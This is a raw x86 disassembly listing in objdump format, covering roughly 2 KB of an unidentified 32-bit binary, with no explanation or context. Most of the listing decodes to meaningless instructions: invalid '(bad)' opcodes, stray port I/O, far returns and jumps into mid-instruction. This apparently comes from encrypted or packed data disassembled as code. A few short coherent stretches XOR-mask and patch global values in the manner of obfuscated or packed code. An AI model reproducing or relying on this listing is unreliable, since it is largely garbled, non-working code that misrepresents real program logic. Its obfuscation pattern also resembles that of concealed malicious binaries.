  4085d9:	adc    ebp,DWORD PTR [eax+0x7a]
  4085dc:	leave  
  4085dd:	sar    BYTE PTR [eax+esi*8-0x5e0dc2de],0xb4
  4085e5:	xor    eax,0x3e9c906f
  4085ea:	shl    DWORD PTR ds:0x29693bb8,1
  4085f0:	test   DWORD PTR [edi+0x18],esp
  4085f3:	ins    BYTE PTR es:[edi],dx
  4085f4:	mov    cl,0x56
  4085f6:	or     al,BYTE PTR [edx+edx*8]
  4085f9:	int    0xcf
  4085fb:	pop    ds
  4085fc:	mov    ah,dh
  4085fe:	aam    0xc4
  408600:	jnp    0x408634
  408602:	inc    ecx
  408603:	sub    dl,ch
  408605:	inc    eax
  408606:	test   al,0xa3
  408608:	gs sahf 
  40860a:	out    0xde,eax
  40860c:	xchg   edx,esi
  40860e:	mov    WORD PTR [ecx],cs
  408610:	or     BYTE PTR [ebx+0x46],dh
  408613:	ror    BYTE PTR [edx+0x266b65d7],1
  408619:	dec    ebx
  40861a:	loope  0x40866b
  40861c:	sub    dh,BYTE PTR [edi+0x60]
  40861f:	neg    DWORD PTR [ebp-0x346c7396]
  408625:	(bad)  [edx+0x10]
  408628:	je     0x408680
  40862a:	(bad)
  40862d:	pushf  
  40862e:	in     al,0x38
  408630:	inc    eax
  408631:	inc    esi
  408632:	das    
  408633:	scas   al,BYTE PTR es:[edi]
  408634:	addr16 loope 0x4085ff
  408637:	lock mov ds:0x196d84e5,eax
  40863d:	out    dx,eax
  40863e:	or     DWORD PTR [eax],edi
  408640:	xchg   edx,eax
  408641:	mov    eax,0x90a3c834
  408646:	stos   DWORD PTR es:[edi],eax
  408647:	imul   ecx,DWORD PTR [esi+0x5c4784a3],0xffffffc9
  40864e:	lea    esp,es:[edi+0x4c]
  408652:	and    BYTE PTR [edi+0x6f],bh
  408655:	jnp    0x4086bb
  408657:	cmp    eax,0x18c8ad74
  40865c:	adc    DWORD PTR [edx-0x3644a7d7],eax
  408662:	pop    ebx
  408663:	pop    ebp
  408664:	shl    BYTE PTR [ebx+esi*8-0x6],cl
  408668:	cmp    bl,BYTE PTR [edi+0x76]
  40866b:	fadd   QWORD PTR es:[ebp+0x92ad52]
  408672:	imul   ebx,DWORD PTR [edi-0x25]
  408676:	inc    ebp
  408677:	mov    esi,0xcc44b11
  40867c:	cmp    dh,BYTE PTR [esi+0x72]
  40867f:	push   esi
  408680:	xchg   ch,bl
  408682:	aad    0xe1
  408684:	fadd   DWORD PTR [ecx]
  408686:	mov    BYTE PTR [ebx+0x1679e0fc],dh
  40868c:	imul   ebx,DWORD PTR [ebp+0x2a],0x5a
  408690:	enter  0xc6a1,0xc6
  408694:	retf   
  408695:	cmp    cl,BYTE PTR [esi-0x44388211]
  40869b:	mov    eax,0x818e12fe
  4086a0:	adc    eax,0x4336e3
  4086a5:	jnp    0x4086dd
  4086a7:	inc    ebx
  4086a8:	add    BYTE PTR [ecx+0x1d81f45d],cl
  4086ae:	outs   dx,DWORD PTR ds:[esi]
  4086af:	aaa    
  4086b0:	inc    ebx
  4086b1:	add    BYTE PTR [edi-0x16ffbcc9],ah
  4086b7:	inc    edx
  4086b8:	add    al,BYTE PTR [eax]
  4086ba:	add    BYTE PTR [edi+0x55],bl
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx-0x1c43c5b6],ecx
  4086ca:	push   0x7e7ed68a
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	retf   0xeca2
  4086d6:	cmp    DWORD PTR [esi],ebx
  4086d8:	fcomp  QWORD PTR [edx]
  4086da:	push   0x2d
  4086dc:	jns    0x4086ab
  4086de:	xor    DWORD PTR [ebx],ebx
  4086e0:	ins    BYTE PTR es:[edi],dx
  4086e1:	sub    BYTE PTR [eax-0x28],ah
  4086e4:	jp     0x4086f7
  4086e6:	pop    ecx
  4086e7:	test   al,0x16
  4086e9:	jp     0x408682
  4086eb:	imul   esi,DWORD PTR [edi+0x62],0xebbf2a04
  4086f2:	stos   BYTE PTR es:[edi],al
  4086f3:	adc    dl,BYTE PTR [edx+0x7deb84d9]
  4086f9:	xor    eax,0xdd1b0683
  4086fe:	mov    al,0xd0
  408700:	ret    0xee3b
  408703:	jg     0x40872d
  408705:	mov    cl,0xf1
  408707:	adc    DWORD PTR [eax+0x45335b06],0x704e08fe
  408711:	xor    al,0x99
  408713:	in     al,0x93
  408715:	pop    ebp
  408716:	mov    WORD PTR [ecx-0x3b],gs
  408719:	lahf   
  40871a:	mov    esi,DWORD PTR [esp+eax*1+0x4d125cd]
  408721:	mov    al,0x9
  408723:	ret    0xe8f
  408726:	dec    BYTE PTR [ebx]
  408728:	push   ebp
  408729:	iret   
  40872a:	push   edx
  40872b:	xlat   BYTE PTR ds:[ebx]
  40872c:	ds cld 
  40872e:	pop    edi
  40872f:	out    0x4e,eax
  408731:	int    0x16
  408733:	in     al,dx
  408734:	mov    ecx,0x82c05066
  408739:	push   0xfffffff0
  40873b:	shl    BYTE PTR [ecx+0xd1bfcf],1
  408741:	sbb    ebx,DWORD PTR [eax-0x5184b0a3]
  408747:	pop    eax
  408748:	dec    ebp
  408749:	lods   eax,DWORD PTR ds:[esi]
  40874a:	jae    0x40871c
  40874c:	and    al,0xa8
  40874e:	int3   
  40874f:	xor    edx,edi
  408751:	lock dec ebx
  408753:	cs sub al,0xc7
  408756:	cmc    
  408757:	adc    edx,DWORD PTR [edx+esi*4-0x276b0abb]
  40875e:	cld    
  40875f:	adc    DWORD PTR [esp+eax*8+0xde24d19],edi
  408766:	push   esi
  408767:	mov    DWORD PTR [eax-0x4d],edi
  40876a:	je     0x4087b1
  40876c:	xor    eax,0x221d4bbd
  408771:	jns    0x4087d1
  408773:	out    dx,al
  408774:	xor    BYTE PTR [eax],cl
  408776:	jns    0x408729
  408778:	ss mov al,ss:0xdde4fee3
  40877f:	mov    esi,0xfce4a91b
  408784:	jmp    0x408721
  408786:	(bad)  
  408787:	mov    eax,0xc2d0c1c4
  40878c:	pop    eax
  40878d:	sub    esp,0x716484bb
  408793:	loopne 0x408814
  408795:	mov    dh,0xa9
  408797:	adc    eax,0x1151a832
  40879c:	repnz fs cmp al,0xf6
  4087a0:	inc    si
  4087a2:	xor    al,0x90
  4087a4:	std    
  4087a5:	(bad)
  4087a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087aa:	ficomp WORD PTR [ecx-0x6c4ddd07]
  4087b0:	xchg   edi,eax
  4087b1:	in     eax,0xaa
  4087b3:	mov    eax,0xfaebb7e
  4087b8:	jnp    0x40878f
  4087ba:	xchg   esp,eax
  4087bb:	lea    eax,[esi]
  4087bd:	sbb    BYTE PTR [edx-0x6b],ch
  4087c0:	ror    ecx,0x1f
  4087c3:	into   
  4087c4:	rcr    BYTE PTR [edi],cl
  4087c6:	adc    al,0xfa
  4087c8:	(bad)  
  4087c9:	je     0x40876c
  4087cb:	sub    DWORD PTR [eax-0x27],ecx
  4087ce:	and    eax,0xd5229dc7
  4087d3:	xor    DWORD PTR [ecx],0xffffff8d
  4087d6:	rol    DWORD PTR [ebp+0x41],cl
  4087d9:	cmp    DWORD PTR [edi],0xfffffff0
  4087dc:	inc    ebp
  4087dd:	add    dl,bh
  4087df:	adc    dh,BYTE PTR [ebx+0x61]
  4087e2:	out    dx,al
  4087e3:	sub    DWORD PTR [ebp+0x6c845fd3],0x14
  4087ea:	retf   
  4087eb:	pop    ebx
  4087ec:	sbb    BYTE PTR [edx-0x5503d9d6],dl
  4087f2:	mov    dl,BYTE PTR [esi+0x6a]
  4087f5:	daa    
  4087f6:	cwde   
  4087f7:	dec    edi
  4087f8:	mov    WORD PTR [ecx+0x33],cs
  4087fb:	out    0x46,eax
  4087fd:	int    0xa2
  4087ff:	(bad)  [edx]
  408801:	aas    
  408802:	sbb    eax,0x92530a88
  408807:	sub    BYTE PTR [eax+0xe47ca51],ah
  40880d:	or     eax,0x1fa626b7
  408812:	mov    eax,0xe4fa18e2
  408817:	imul   eax,DWORD PTR [eax-0xe],0xffffffb6
  40881b:	stos   BYTE PTR es:[edi],al
  40881c:	ret    
  40881d:	ins    BYTE PTR es:[edi],dx
  40881e:	mov    dl,ah
  408820:	mov    dl,0xc5
  408822:	arpl   WORD PTR [esi+0x660dd762],cx
  408828:	in     al,dx
  408829:	sub    DWORD PTR [eax+0x23],edi
  40882c:	or     eax,0x4a82900b
  408831:	imul   esi,DWORD PTR [edi+0x62],0xffffffc9
  408835:	mov    ds:0x102133eb,al
  40883a:	fnstenv [eax+0x65f92456]
  408840:	cld    
  408841:	and    al,0x60
  408843:	push   ss
  408844:	in     al,0xcf
  408846:	into   
  408847:	sbb    ebx,DWORD PTR [eax-0x431bb2eb]
  40884d:	mov    ebp,ebx
  40884f:	fisub  WORD PTR [ecx-0x4b7b6c26]
  408855:	sub    ecx,DWORD PTR [ecx+0x7a932f6d]
  40885b:	outs   dx,DWORD PTR ds:[esi]
  40885c:	(bad)  
  40885d:	rol    ah,cl
  40885f:	cmp    eax,0x54fcd0c1
  408864:	(bad)  
  408865:	aad    0x6e
  408867:	fs aam 0x36
  40886a:	ror    BYTE PTR [ebp-0x38b7bea7],1
  408870:	add    ah,BYTE PTR [eax+0x73]
  408873:	out    dx,eax
  408874:	test   BYTE PTR [esi+0xa],bl
  408877:	xchg   esp,eax
  408878:	mov    al,ds:0xa2dc84d
  40887d:	sahf   
  40887e:	scas   al,BYTE PTR es:[edi]
  40887f:	cmp    DWORD PTR [edi-0x31],0xdcd2fb96
  408886:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408887:	inc    edx
  408888:	retf   0x1f8
  40888b:	fcmovnbe st,st(5)
  40888d:	adc    dh,BYTE PTR [esi-0x37]
  408890:	in     al,0x3
  408892:	pop    ecx
  408893:	jb     0x4088f8
  408895:	mov    bl,0x6d
  408897:	ret    0x62da
  40889a:	ffree  st(4)
  40889c:	pop    eax
  40889d:	mov    WORD PTR [edx-0x531526f8],cs
  4088a3:	fsubrp st(2),st
  4088a5:	xlat   BYTE PTR ds:[ebx]
  4088a6:	sti    
  4088a7:	mov    ah,BYTE PTR [edx+0x2e]
  4088aa:	cmp    BYTE PTR [ecx],dh
  4088ac:	lea    eax,[eax]
  4088ae:	mov    ecx,DWORD PTR [edx-0x49]
  4088b1:	mul    bh
  4088b3:	mov    esp,DWORD PTR [esi+edi*1+0x4fb150f]
  4088ba:	mov    eax,ds:0x788ceca0
  4088bf:	mov    ch,0x1b
  4088c1:	pop    ebp
  4088c2:	in     eax,dx
  4088c3:	mov    al,0x60
  4088c5:	and    esp,DWORD PTR [eax+eiz*8+0x33]
  4088c9:	xchg   ebx,eax
  4088ca:	push   0xa91865f4
  4088cf:	mov    ds:0x50b00382,eax
  4088d4:	xchg   ecx,eax
  4088d5:	ss mov ah,0x65
  4088d8:	inc    edi
  4088d9:	push   ebx
  4088da:	add    edx,edi
  4088dc:	lds    ecx,FWORD PTR [eax+esi*4+0x6a]
  4088e0:	pop    eax
  4088e1:	leave  
  4088e2:	cli    
  4088e3:	into   
  4088e4:	out    dx,al
  4088e5:	test   al,0x85
  4088e7:	outs   dx,BYTE PTR ds:[esi]
  4088e8:	sub    al,dh
  4088ea:	pop    ebx
  4088eb:	dec    esp
  4088ec:	test   eax,0xc681777b
  4088f1:	iret   
  4088f2:	push   ebx
  4088f3:	addr16 dec edi
  4088f5:	add    BYTE PTR [edx+0x32b5ad36],dl
  4088fb:	hlt    
  4088fc:	popf   
  4088fd:	mov    eax,DWORD PTR [eax]
  4088ff:	xor    DWORD PTR ds:0x4336e3,0x7c2a
  408909:	mov    cx,WORD PTR [ebp-0x4]
  40890d:	adc    DWORD PTR ds:0x43375b,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x4336d3,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43369f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x4337a7,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0x9890e02c
  408968:	(bad)  
  408969:	mov    al,0xd4
  40896b:	jle    0x4089eb
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	out    dx,eax
  408972:	xchg   esp,eax
  408973:	lods   eax,DWORD PTR ds:[esi]
  408974:	loop   0x4089a8
  408976:	sti    
  408977:	shl    DWORD PTR ds:0x10ab68e6,1
  40897d:	pop    ss
  40897e:	jmp    0x40894a
  408980:	pop    edx
  408981:	stc    
  408982:	aas    
  408983:	mov    edx,0xd7631fd3
  408988:	nop
  408989:	inc    ebx
  40898a:	scas   eax,DWORD PTR es:[edi]
  40898b:	jcxz   0x4089df
  40898e:	js     0x408945
  408990:	dec    edx
  408991:	sub    dl,BYTE PTR [bp+si+0x7a03]
  408996:	frstor [esi]
  408998:	in     eax,0x7f
  40899a:	imul   ecx,DWORD PTR [esi],0x30ffbb88
  4089a0:	push   ss
  4089a1:	xchg   ebx,eax
  4089a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089a3:	cli    
  4089a4:	or     bh,BYTE PTR [ebx]
  4089a6:	mov    fs,WORD PTR [ecx-0x19ed1b9]
  4089ac:	je     0x4089d3
  4089ae:	dec    edx
  4089af:	es call 0xb73caa2f
  4089b5:	inc    ebx
  4089b6:	and    al,al
  4089b8:	pop    ebx
  4089b9:	mov    DWORD PTR [edx-0x4b],edx
  4089bc:	outs   dx,BYTE PTR ds:[esi]
  4089bd:	gs je  0x4089ab
  4089c0:	fdivp  st(2),st
  4089c2:	jb     0x40896d
  4089c4:	cmp    bh,bh
  4089c6:	iret   
  4089c7:	mov    BYTE PTR [ebx+0x6d3b65c2],al
  4089cd:	sub    eax,0xca27650a
  4089d2:	mov    eax,0x725bbd7f
  4089d7:	imul   edi,DWORD PTR [ebx+0x6e],0xffffffdf
  4089db:	dec    eax
  4089dc:	xor    DWORD PTR [ecx+0x33a87e5c],ecx
  4089e2:	adc    ch,BYTE PTR [eax+0x487bb99f]
  4089e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089e9:	outs   dx,DWORD PTR ds:[esi]
  4089ea:	je     0x408a51
  4089ec:	loope  0x408a4c
  4089ee:	nop
  4089ef:	hlt    
  4089f0:	retf   
  4089f1:	pop    es
  4089f2:	or     BYTE PTR [edi+0x78b511f6],bl
  4089f8:	cmp    ch,BYTE PTR [esi-0x54f6b50e]
  4089fe:	pop    ebx
  4089ff:	jae    0x4089f1
  408a01:	mov    eax,0xd433c134
  408a06:	adc    edi,DWORD PTR [esi-0x20378838]
  408a0c:	xor    al,0x3
  408a0e:	dec    edi
  408a0f:	push   es
  408a10:	mov    esi,esi
  408a12:	inc    ecx
  408a13:	dec    esp
  408a14:	div    DWORD PTR [esp+eiz*8]
  408a17:	into   
  408a18:	jge    0x4089ad
  408a1a:	mov    edi,0x72d2cdc2
  408a1f:	jb     0x4089a6
  408a21:	mov    eax,0x60b95061
  408a26:	mov    bl,0x96
  408a28:	fldcw  WORD PTR [ebp-0x7b]
  408a2b:	mov    cl,0x2d
  408a2d:	mov    WORD PTR [ebx-0x12],?
  408a30:	fmul   QWORD PTR [edi-0x24]
  408a33:	sbb    dh,al
  408a35:	mov    edx,edi
  408a37:	ds mov ebx,0x5f678216
  408a3d:	push   esp
  408a3e:	out    0x80,eax
  408a40:	jle    0x408a36
  408a42:	add    ecx,ebx
  408a44:	popa   
  408a45:	dec    edi
  408a46:	fwait
  408a47:	ins    BYTE PTR es:[edi],dx
  408a48:	xor    esi,ebp
  408a4a:	jg     0x4089f9
  408a4c:	sbb    bl,bl
  408a4e:	ret    
  408a4f:	sub    bl,bl
  408a51:	xor    DWORD PTR [ebx+esi*1+0x2f],edi
  408a55:	inc    edx
  408a56:	xor    al,0xf1
  408a58:	pop    eax
  408a59:	xchg   esp,eax
  408a5a:	xor    ebp,DWORD PTR [edx+ecx*8-0x3116cebb]
  408a61:	les    ebp,FWORD PTR [eax+0x1]
  408a64:	jecxz  0x408a2c
  408a66:	(bad)  
  408a67:	inc    ebx
  408a68:	js     0x408a05
  408a6a:	mov    al,ds:0x46ee0e8
  408a6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a70:	cmp    BYTE PTR [eax+0x7dd55fcc],0xbd
  408a77:	nop
  408a78:	mov    dl,0x4e
  408a7a:	mov    esi,esi
  408a7c:	out    0xd3,eax
  408a7e:	daa    
  408a7f:	push   eax
  408a80:	jmp    0xbf17cd3f
  408a85:	xchg   edx,eax
  408a86:	aam    0x56
  408a88:	lea    edi,[ebp+0x755f6260]
  408a8e:	cmp    dh,BYTE PTR [edx-0x39]
  408a91:	xchg   edi,eax
  408a92:	mov    fs,WORD PTR [ecx-0x259f2b20]
  408a98:	ins    BYTE PTR es:[edi],dx
  408a99:	test   eax,0x5367c877
  408a9e:	push   0x28
  408aa0:	push   ebp
  408aa1:	out    0x3c,eax
  408aa3:	push   edx
  408aa4:	cmp    DWORD PTR [ecx-0x4c47b1a8],edx
  408aaa:	stos   BYTE PTR es:[edi],al
  408aab:	inc    eax
  408aac:	add    al,0x7f
  408aae:	inc    eax
  408aaf:	push   cs
  408ab0:	mov    dh,0xe5
  408ab2:	das    
  408ab3:	or     DWORD PTR [edi+ecx*1],edx
  408ab6:	cld    
  408ab7:	fcomp  QWORD PTR [ebx+0x1984cf7c]
  408abd:	enter  0xa9f4,0x37
  408ac1:	and    ebp,DWORD PTR [ebp+0x3]
  408ac4:	adc    DWORD PTR [ebx+0xa],ebp
  408ac7:	lea    edi,[ecx-0x1e]
  408aca:	lods   eax,DWORD PTR ds:[esi]
  408acb:	mov    ?,WORD PTR [esi+0x765b6ac8]
  408ad1:	stc    
  408ad2:	mov    bh,0xbe
  408ad4:	in     al,0x6e
  408ad6:	cmc    
  408ad7:	push   edi
  408ad8:	call   0x23bb:0xd3f60769
  408adf:	retf   0x2cb2
  408ae2:	jmp    0x408ab4
  408ae4:	std    
  408ae5:	push   esp
  408ae6:	push   ss
  408ae7:	(bad)  
  408ae8:	pop    esp
  408ae9:	outs   dx,BYTE PTR ds:[esi]
  408aea:	xor    DWORD PTR [esi-0x614b505b],eax
  408af0:	shr    BYTE PTR [edi],cl
  408af2:	fimul  WORD PTR [edi]
  408af4:	xchg   ebp,eax
  408af5:	(bad)  
  408af6:	dec    DWORD PTR [esi]
  408af8:	in     eax,0x77
  408afa:	in     eax,0x86
  408afc:	sti    
  408afd:	jne    0x408ae2
  408aff:	clc    
  408b00:	hlt    
  408b01:	stc    
  408b02:	icebp  
  408b03:	pop    ss
  408b04:	ds add al,0xe1
  408b07:	loop   0x408b1c
  408b09:	scas   al,BYTE PTR es:[edi]
  408b0a:	out    0xaa,al
  408b0c:	jge    0x408b17
  408b0e:	push   eax
  408b0f:	hlt    
  408b10:	int    0x32
  408b12:	lods   al,BYTE PTR ds:[esi]
  408b13:	test   eax,0x9a788360
  408b18:	lock retw 
  408b1b:	inc    ecx
  408b1c:	mov    ch,0xce
  408b1e:	xchg   edx,eax
  408b1f:	add    al,0x65
  408b21:	arpl   WORD PTR [edi+0xadfa626],si
  408b27:	add    BYTE PTR [ecx+0xc],ch
  408b2a:	mov    bh,BYTE PTR [ebp+0x5c83084c]
  408b30:	add    al,cl
  408b32:	sbb    DWORD PTR [edx+0x6d],edx
  408b35:	mov    ecx,0x52c1da60
  408b3a:	and    BYTE PTR ds:0x517f20bc,ah
  408b40:	sti    
  408b41:	sub    al,0xb8
  408b43:	xchg   edx,eax
  408b44:	add    esi,DWORD PTR [eax-0x4b]
  408b47:	sub    edi,DWORD PTR [ecx-0x2cda5faa]
  408b4d:	rcl    DWORD PTR [ebp-0x19dfa58f],cl
  408b53:	mov    ds:0xd163cda,al
  408b58:	pushf  
  408b59:	jmp    0x408b77
  408b5b:	push   ecx
  408b5c:	std    
  408b5d:	lods   al,BYTE PTR ds:[esi]
  408b5e:	adc    ecx,DWORD PTR [eax]
  408b60:	test   al,0x17
  408b62:	mov    eax,ds:0xfe6097ea
  408b67:	icebp  
  408b68:	push   ecx
  408b69:	sbb    BYTE PTR [ebp+esi*4-0x73],ch
  408b6d:	push   cs
  408b6e:	or     al,0x51
  408b70:	mov    bl,BYTE PTR [esi-0x4e]
  408b73:	sub    eax,0xff8e3c2e
  408b78:	fidiv  WORD PTR [ebp+0x6afef35c]
  408b7e:	jno    0x408b7c
  408b80:	stc    
  408b81:	and    DWORD PTR [ecx-0x2e90143f],esi
  408b87:	and    DWORD PTR [edi-0x61],edx
  408b8a:	xchg   ebx,eax
  408b8b:	or     al,BYTE PTR [esi-0x19]
  408b8e:	iret   
  408b8f:	dec    edi
  408b90:	or     edi,ebp
  408b92:	mov    WORD PTR fs:[edi-0x6d],ss
  408b96:	push   edi
  408b97:	idiv   DWORD PTR [esp+eiz*8-0x7d]
  408b9b:	jne    0x408bbe
  408ba1:	mov    eax,DWORD PTR [ebp+0x8]
  408ba4:	mov    ecx,DWORD PTR [ebp-0x10]
  408ba7:	xor    eax,esi
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	ror    BYTE PTR [ecx],cl
  408bf2:	pop    eax
  408bf3:	jg     0x408c5b
  408bf5:	sar    BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	inc    esi
  408bfd:	pushf  
  408bfe:	push   DWORD PTR [esi+edx*8]
  408c01:	aad    0x99
  408c03:	and    DWORD PTR [ecx-0x77],0x25
  408c07:	inc    edx
  408c08:	mov    esp,0xdb7861f6
  408c0d:	push   ebx
  408c0e:	mov    es,WORD PTR [ebx]
  408c10:	dec    eax
  408c11:	push   ecx
  408c12:	mov    ds:0x39a734b2,eax
  408c17:	enter  0x99c8,0x65
  408c1b:	stc    
  408c1c:	into   
  408c1d:	ins    BYTE PTR es:[edi],dx
  408c1e:	scas   al,BYTE PTR es:[edi]
  408c1f:	cmp    DWORD PTR [eax],0x73
  408c22:	inc    ecx
  408c23:	mov    WORD PTR [edi-0x5bff89db],cs
  408c29:	sahf   
  408c2a:	xor    ebx,DWORD PTR [edi-0x30e5867f]
  408c30:	push   edx
  408c31:	aad    0x4f
  408c33:	push   esi
  408c34:	mov    esp,ebx
  408c36:	push   ecx
  408c37:	int3   
  408c38:	loop   0x408c41
  408c3a:	xchg   edi,eax
  408c3b:	jecxz  0x408c09
  408c3d:	or     ch,BYTE PTR [ebp+0x58]
  408c40:	sahf   
  408c41:	sub    ebp,0x27
  408c44:	aas    
  408c45:	xchg   BYTE PTR [ebp-0x6ea1c9ff],dh
  408c4b:	test   edi,esp
  408c4d:	push   ss
  408c4e:	sbb    al,0x9c
  408c51:	scas   al,BYTE PTR es:[edi]
  408c52:	xlat   BYTE PTR ds:[ebx]
  408c53:	mov    WORD PTR [ebp-0x30abed93],ss
  408c59:	mov    edx,0xccc5f59b
  408c5e:	test   eax,0xb288a621
  408c63:	cmp    dl,BYTE PTR [edi+esi*1-0x67]
  408c67:	clc    
  408c68:	out    0x1d,al
  408c6a:	shl    DWORD PTR [edx],0xec
  408c6d:	or     eax,0x8326b38f
  408c72:	pop    es
  408c73:	jo     0x408c15
  408c75:	mov    ebp,0xf51abaa6
  408c7a:	push   ss
  408c7b:	xchg   ecx,eax
  408c7c:	xchg   ebp,eax
  408c7d:	lods   eax,DWORD PTR ds:[esi]
  408c7e:	push   0x56c5519d
  408c83:	xor    edi,DWORD PTR [ebp-0x64a10a7f]
  408c89:	push   edx
  408c8a:	or     al,BYTE PTR [ebx+ebx*8+0x1a686304]
  408c91:	loope  0x408c8a
  408c93:	fadd   DWORD PTR ds:0x712f056f
  408c99:	in     al,dx
  408c9a:	shl    BYTE PTR [edx+0x42],0x4a
  408c9e:	push   edx
  408c9f:	out    dx,eax
  408ca0:	or     DWORD PTR [ecx+0x3391b713],edi
  408ca6:	cmp    DWORD PTR [ecx-0x17788890],0x555b7a2c
  408cb0:	lock shl BYTE PTR [ecx+0x6a6f952c],cl
  408cb7:	jae    0x408d15
  408cb9:	or     eax,0xde12330d
  408cbe:	mov    ecx,0x10eda11b
  408cc3:	lods   al,BYTE PTR ds:[esi]
  408cc4:	xchg   ecx,eax
  408cc5:	jge    0x408c48
  408cc7:	loop   0x408cb8
  408cc9:	test   al,0xb7
  408ccb:	sbb    DWORD PTR [edi+0x62],ebp
  408cce:	dec    ecx
  408ccf:	push   ds
  408cd0:	rcr    BYTE PTR [edx+0x5d],0x90
  408cd4:	nop
  408cd5:	sbb    esp,DWORD PTR [ebp+0x12]
  408cd8:	loopne 0x408d4e
  408cda:	pop    ds
  408cdb:	xchg   ebx,eax
  408cdc:	inc    ebp
  408cdd:	test   BYTE PTR [eax+0x5c99943d],cl
  408ce3:	test   BYTE PTR [esi],0xdf
  408ce6:	sbb    edi,0xedee3519
  408cec:	push   ecx
  408ced:	(bad)  
  408cee:	cwde   
  408cef:	mov    eax,ds:0xb26f4c06
  408cf4:	scas   al,BYTE PTR es:[edi]
  408cf5:	cld    
  408cf6:	mov    ebx,0x1ce1f7d3
  408cfb:	push   esi
  408cfc:	dec    ecx
  408cfd:	lock jne 0x408d19
  408d00:	and    ah,BYTE PTR [esi+eiz*1-0x7bca9873]
  408d07:	cmp    esi,DWORD PTR [ebp+ecx*2+0x281f2293]
  408d0e:	cmc    
  408d0f:	or     BYTE PTR [ebx+0x4d],0x43
  408d13:	aaa    
  408d14:	stos   DWORD PTR es:[edi],eax
  408d15:	add    al,0x16
  408d17:	(bad)  ds:0x7954b7af
  408d1d:	mov    ah,0x89
  408d1f:	loope  0x408d38
  408d21:	lods   eax,DWORD PTR ds:[esi]
  408d22:	(bad)  
  408d23:	and    eax,0x250171e1
  408d28:	cmp    DWORD PTR [edi],edx
  408d2a:	mov    ecx,0x206efc99
  408d2f:	or     ebx,DWORD PTR [edi-0x1e]
  408d32:	fs out 0xe5,eax
  408d35:	dec    ecx
  408d36:	push   0xffffffa1
  408d38:	cmp    BYTE PTR [ebp+0x3c5f4141],cl
  408d3e:	cmp    DWORD PTR [edi-0x2b],0xeac50776
  408d45:	retf   0x2884
  408d48:	mov    WORD PTR [edx-0x48],ss
  408d4b:	push   cs
  408d4c:	loop   0x408d0e
  408d4e:	adc    ecx,edx
  408d50:	or     edx,0xd12b0993
  408d56:	mov    ecx,0x7723c50a
  408d5b:	scas   eax,DWORD PTR es:[edi]
  408d5c:	stos   DWORD PTR es:[edi],eax
  408d5d:	ret    
  408d5e:	or     eax,0x5cb054ef
  408d63:	scas   al,BYTE PTR es:[edi]
  408d64:	repz imul ebx,DWORD PTR [esi-0x71],0xfffffff7
  408d69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d6a:	mov    cs,WORD PTR [ebx-0x6b654998]
  408d70:	mov    al,ds:0xad919ac9
  408d75:	dec    ebp
  408d76:	pop    esi
  408d77:	test   eax,0xfa717903
  408d7c:	sbb    eax,0x88eec5f3
  408d81:	dec    edi
  408d82:	sahf   
  408d83:	mov    ah,0x61
  408d85:	push   cs
  408d86:	push   ebp
  408d87:	inc    esi
  408d88:	nop
  408d89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d8a:	sbb    esp,DWORD PTR [ecx+edi*1]
  408d8d:	mov    WORD PTR [edi],gs
  408d8f:	jge    0x408dcf
  408d91:	in     al,0xb0
  408d93:	pop    edx
  408d94:	mov    edx,0xdf1e9b32
  408d99:	enter  0x2cf3,0x1e
  408d9d:	test   eax,0xad09b0b9
  408da2:	sbb    dh,BYTE PTR [eax]
  408da4:	pusha  
  408da5:	fmul   QWORD PTR [ecx-0xd]
  408da8:	xor    DWORD PTR [ebp-0x59],edx
  408dab:	sub    al,0xca
  408dad:	fbld   TBYTE PTR [edx+0x3b]
  408db0:	sbb    bl,BYTE PTR [ebx]
  408db2:	(bad)  
  408db3:	fnstsw WORD PTR [edx]
  408db5:	cmp    al,0xa5
  408db7:	push   ss
